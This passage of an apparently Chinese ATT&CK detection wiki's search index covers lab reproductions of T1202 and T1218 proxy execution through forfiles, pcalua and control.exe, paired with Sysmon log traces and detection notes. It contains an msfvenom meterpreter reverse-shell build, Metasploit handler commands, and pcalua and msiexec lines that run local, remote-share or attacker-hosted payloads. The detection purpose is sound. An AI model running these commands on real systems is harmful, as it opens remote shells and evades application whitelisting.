http://192.168.126.146/abc.txt\"","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#shell","text":"\u53cd\u5f39shell\u5931\u8d25\uff01\uff01\uff01\u4f46\u4e0d\u5f71\u54cd\u540e\u7eed\u5206\u6790","title":"\u53cd\u5f39shell"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_6","text":"#sysmon\u65e5\u5fd7 EventID\uff1a1 Process Create: RuleName: UtcTime: 2020-04-18 16:27:08.447 ProcessGuid: {bb1f7c32-2a5c-5e9b-0000-0010b3101d00} ProcessId: 588 Image: C:\\Windows\\System32\\msiexec.exe FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850) Description: Windows\u00ae installer Product: Windows Installer - Unicode Company: Microsoft Corporation OriginalFileName: msiexec.exe CommandLine: /q /i http://192.168.126.146/abc.txt CurrentDirectory: C:\\Windows\\system32\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020b86d0600} LogonId: 0x66db8 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD ParentProcessGuid: {bb1f7c32-2a5c-5e9b-0000-00100a101d00} ParentProcessId: 1220 ParentImage: C:\\Windows\\System32\\forfiles.exe ParentCommandLine: forfiles /p c:\\windows\\system32 /m cmd.exe /c \"msiexec.exe /q /i http://192.168.126.146/abc.txt\" #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x4c4 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\forfiles.exe","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_7","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload/#_8","text":"MITRE-ATT&CK-T1202 https://attack.mitre.org/techniques/T1202/ \u57fa\u4e8e\u767d\u540d\u5355Forfiles\u6267\u884cpayload https://www.bookstack.cn/read/Micro8/Chapter1-81-90-84_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3.md","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/","text":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Pcalua\u6267\u884cpayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09 \u6d4b\u8bd5\u6848\u4f8b Windows\u8fdb\u7a0b\u517c\u5bb9\u6027\u52a9\u7406(Program Compatibility Assistant)\u7684\u4e00\u4e2a\u7ec4\u4ef6\u3002 \u8bf4\u660e\uff1aPcalua.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cPcalua\u547d\u4ee4\u53ef\u8bc6\u522b Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\pcalua.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7 \u653b\u51fb\u5206\u6790 \u751f\u6210payload msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=6666 -f exe > shell.exe MSF\u914d\u7f6e msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 5555 lport => 5555 msf5 exploit(multi/handler) > exploit \u9776\u673a\u6267\u884cpayload Pcalua -m -a \\\\192.168.1.119\\share\\shell.exe #\u53ef\u8fdc\u7a0b\u52a0\u8f7d Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe #\u53ef\u672c\u5730\u52a0\u8f7d \u53cd\u5f39shell Msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:6666 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 4 opened (192.168.126.146:6666 -> 192.168.126.149:49163) at 2020-04-19 00:12:39 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 meterpreter > getpid Current pid: 2804 \u6d4b\u8bd5\u7559\u75d5 #sysmon\u65e5\u5fd7 EventID: 1 Process Create: RuleName: UtcTime: 2020-04-18 16:12:37.744 ProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00} ProcessId: 2148 Image: C:\\Windows\\System32\\pcalua.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Program Compatibility Assistant Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: CommandLine: Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600} LogonId: 0x66ddb TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=280038828C2412F3867DDB22E07759CB26F7D8EA ParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00} ParentProcessId: 2724 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" EventID: 1 Process Create: RuleName: UtcTime: 2020-04-18 16:12:37.775 ProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00} ProcessId: 2804 Image: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe FileVersion: 2.2.14 Description: ApacheBench command line utility Product: Apache HTTP Server Company: Apache Software Foundation OriginalFileName: ab.exe CommandLine: \"C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\" CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600} LogonId: 0x66ddb TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C ParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00} ParentProcessId: 2148 ParentImage: C:\\Windows\\System32\\pcalua.exe ParentCommandLine: Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x864 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\pcalua.exe EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xaf4 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe EventID\uff1a5156 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 2804 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\shell.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49163 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 6666 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1202 https://attack.mitre.org/techniques/T1202/ \u6e17\u900f\u6d4b\u8bd5-\u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload--Pcalua https://blog.csdn.net/qq_17204441/article/details/89881795","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Pcalua\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#t1202-win-pcaluapayload","text":"","title":"T1202-win-\u57fa\u4e8e\u767d\u540d\u5355Pcalua\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#attck","text":"\u53ef\u4ee5\u4f7f\u7528\u5404\u79cdWindows\u5b9e\u7528\u7a0b\u5e8f\u6765\u6267\u884c\u547d\u4ee4\uff0c\u800c\u4e0d\u9700\u8981\u8c03\u7528cmd\u3002\u4f8b\u5982\uff0cForfiles\u3001\u7a0b\u5e8f\u517c\u5bb9\u6027\u52a9\u624b\uff08pcalua.exe\uff09\u3001WSL\uff08WindowsSubsystem for Linux\uff09\u7ec4\u4ef6\u4ee5\u53ca\u5176\u4ed6\u5b9e\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u754c\u9762\u3001\u8fd0\u884c\u7a97\u53e3\u6216\u901a\u8fc7\u811a\u672c\u6765\u8c03\u7528\u7a0b\u5e8f\u548c\u547d\u4ee4\u7684\u6267\u884c\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528\u8fd9\u4e9b\u529f\u80fd\u6765\u89c4\u907f\u9632\u5fa1\uff0c\u5c24\u5176\u662f\u5728\u7834\u574f\u68c0\u6d4b\u548c/\u6216\u7f13\u89e3\u63a7\u5236\uff08\u5982\u7ec4\u7b56\u7565\uff09\u7684\u540c\u65f6\u6267\u884c\u4efb\u610f\u52a8\u4f5c\u3002\uff08\u8fd9\u4e9b\u63a7\u5236\u9650\u5236/\u963b\u6b62\u4e86cmd\u6216\u6076\u610f\u8d1f\u8f7d\u76f8\u5173\u6587\u4ef6\u6269\u5c55\u540d\u7684\u4f7f\u7528\u3002\uff09","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_1","text":"Windows\u8fdb\u7a0b\u517c\u5bb9\u6027\u52a9\u7406(Program Compatibility Assistant)\u7684\u4e00\u4e2a\u7ec4\u4ef6\u3002 \u8bf4\u660e\uff1aPcalua.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cPcalua\u547d\u4ee4\u53ef\u8bc6\u522b Windows 7 \u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\pcalua.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#payload","text":"msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=6666 -f exe > shell.exe","title":"\u751f\u6210payload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#msf","text":"msf5 exploit(multi/handler) > back msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 5555 lport => 5555 msf5 exploit(multi/handler) > exploit","title":"MSF\u914d\u7f6e"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#payload_1","text":"Pcalua -m -a \\\\192.168.1.119\\share\\shell.exe #\u53ef\u8fdc\u7a0b\u52a0\u8f7d Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe #\u53ef\u672c\u5730\u52a0\u8f7d","title":"\u9776\u673a\u6267\u884cpayload"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#shell","text":"Msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:6666 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 4 opened (192.168.126.146:6666 -> 192.168.126.149:49163) at 2020-04-19 00:12:39 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 meterpreter > getpid Current pid: 2804","title":"\u53cd\u5f39shell"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_6","text":"#sysmon\u65e5\u5fd7 EventID: 1 Process Create: RuleName: UtcTime: 2020-04-18 16:12:37.744 ProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00} ProcessId: 2148 Image: C:\\Windows\\System32\\pcalua.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Program Compatibility Assistant Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: CommandLine: Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600} LogonId: 0x66ddb TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=280038828C2412F3867DDB22E07759CB26F7D8EA ParentProcessGuid: {bb1f7c32-26ca-5e9b-0000-00109cdf0d00} ParentProcessId: 2724 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" EventID: 1 Process Create: RuleName: UtcTime: 2020-04-18 16:12:37.775 ProcessGuid: {bb1f7c32-26f5-5e9b-0000-0010621a0e00} ProcessId: 2804 Image: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe FileVersion: 2.2.14 Description: ApacheBench command line utility Product: Apache HTTP Server Company: Apache Software Foundation OriginalFileName: ab.exe CommandLine: \"C:\\Users\\12306Br0\\Desktop\\a\\shell.exe\" CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-25f5-5e9b-0000-0020db6d0600} LogonId: 0x66ddb TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=C11C194CA5D0570F1BC85BB012F145BAFC9A4D6C ParentProcessGuid: {bb1f7c32-26f5-5e9b-0000-001075120e00} ParentProcessId: 2148 ParentImage: C:\\Windows\\System32\\pcalua.exe ParentCommandLine: Pcalua -m -a C:\\Users\\12306Br0\\Desktop\\a\\shell.exe #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x864 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\pcalua.exe EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xaf4 \u65b0\u8fdb\u7a0b\u540d: C:\\Users\\12306Br0\\Desktop\\a\\shell.exe EventID\uff1a5156 \u5e94\u7528\u7a0b\u5e8f\u4fe1\u606f: \u8fdb\u7a0b ID: 2804 \u5e94\u7528\u7a0b\u5e8f\u540d\u79f0: \\device\\harddiskvolume2\\users\\12306br0\\desktop\\a\\shell.exe \u7f51\u7edc\u4fe1\u606f: \u65b9\u5411: \u51fa\u7ad9 \u6e90\u5730\u5740: 192.168.126.149 \u6e90\u7aef\u53e3: 49163 \u76ee\u6807\u5730\u5740: 192.168.126.146 \u76ee\u6807\u7aef\u53e3: 6666","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_7","text":"\u65e0\u5177\u4f53\u68c0\u6d4b\u3002\u76d1\u63a7\u548c\u5206\u6790\u57fa\u4e8e\u4e3b\u673a\u7684\u68c0\u6d4b\u673a\u5236\uff08\u5982Sysmon\uff09\u4e2d\u7684\u65e5\u5fd7\u6765\u67e5\u770b\u4e8b\u4ef6\uff0c\u6bd4\u5982\u67e5\u770b\u662f\u5426\u6709\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef6\uff08\u521b\u5efa\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u4e86\u53c2\u6570\u6765\u8c03\u7528\u7a0b\u5e8f/\u547d\u4ee4/\u6587\u4ef6\u548c/\u6216\u751f\u6210\u5b50\u8fdb\u7a0b/\u7f51\u7edc\u8fde\u63a5\uff0c\u6216\u8005\u8be5\u521b\u5efa\u662f\u7531\u8fd9\u4e9b\u53c2\u6570\u5bfc\u81f4\u7684\uff09\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1202-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload/#_8","text":"MITRE-ATT&CK-T1202 https://attack.mitre.org/techniques/T1202/ \u6e17\u900f\u6d4b\u8bd5-\u57fa\u4e8e\u767d\u540d\u5355\u6267\u884cpayload--Pcalua https://blog.csdn.net/qq_17204441/article/details/89881795","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1218-002-win-%E7%AD%BE%E5%90%8D%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BB%A3%E7%90%86%E6%89%A7%E8%A1%8C%3A%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF/","text":"T1218-002-win-\u7b7e\u540d\u7684\u4e8c\u8fdb\u5236\u4ee3\u7406\u6267\u884c\uff1a\u63a7\u5236\u9762\u677f \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u6ee5\u7528control.exe\u4ee3\u7406\u6076\u610f\u8d1f\u8f7d\u7684\u6267\u884c\u3002 Windows\u201c\u63a7\u5236\u9762\u677f\u201d\u8fdb\u7a0b\u4e8c\u8fdb\u5236\u6587\u4ef6\uff08control.exe\uff09\u5904\u7406\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u7684\u6267\u884c\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u662f\u4f7f\u7528\u6237\u53ef\u4ee5\u67e5\u770b\u548c\u8c03\u6574\u8ba1\u7b97\u673a\u8bbe\u7f6e\u7684\u5b9e\u7528\u7a0b\u5e8f\u3002 \u63a7\u5236\u9762\u677f\u9879\u76ee\u662f\u6ce8\u518c\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff08.exe\uff09\u6216\u63a7\u5236\u9762\u677f\uff08.cpl\uff09\u6587\u4ef6\uff0c\u540e\u8005\u5b9e\u9645\u4e0a\u662f\u91cd\u547d\u540d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\uff08.dll\uff09\u6587\u4ef6\uff0c\u5b83\u4eec\u5bfc\u51faCPlApplet\u51fd\u6570\u3002\u4e3a\u4e86\u6613\u4e8e\u4f7f\u7528\uff0c\u201c\u63a7\u5236\u9762\u677f\u201d\u9879\u901a\u5e38\u5305\u62ec\u5728\u6ce8\u518c\u5e76\u52a0\u8f7d\u5230\u201c\u63a7\u5236\u9762\u677f\u201d\u4e2d\u540e\u53ef\u4f9b\u7528\u6237\u4f7f\u7528\u7684\u56fe\u5f62\u83dc\u5355\u3002\u53ef\u4ee5\u4ece\u547d\u4ee4\u884c\u76f4\u63a5\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\uff0c\u53ef\u4ee5\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7f16\u7a0b\u63a5\u53e3\uff08API\uff09\u8c03\u7528\u4ee5\u7f16\u7a0b\u65b9\u5f0f\u6267\u884c\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u53cc\u51fb\u6587\u4ef6\u6765\u6267\u884c\u3002 